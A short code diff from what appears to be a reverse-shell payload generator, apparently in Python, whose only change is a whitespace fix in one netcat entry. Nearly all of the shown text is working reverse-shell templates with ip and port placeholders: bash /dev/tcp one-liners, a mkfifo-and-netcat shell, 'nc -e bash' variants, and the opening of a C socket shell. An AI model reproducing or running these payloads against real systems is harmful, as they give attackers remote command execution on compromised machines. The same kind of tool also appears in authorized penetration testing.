@@ -121,7 +121,7 @@ function printit ($string) {chr(123)}{chr(125)}
 """],
 
 'bash' : [f""" bash -i >& /dev/tcp/<ip>/<port> 0>&1""",f""" 0<&196;exec 196<>/dev/tcp/<ip>/<port>; bash <&196 >&196 2>&196""", f""" exec 5<>/dev/tcp/<ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done """],
-'nc' : [f""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ip> <port> >/tmp/f """,f""" nc -e bash <ip> <port> """, f"""nc.exe -e bash <ip> <port> """],
+'nc' : [f""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <ip> <port> >/tmp/f """,f""" nc -e bash <ip> <port> """, f""" nc.exe -e bash <ip> <port> """],
 'c' : [f""" #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
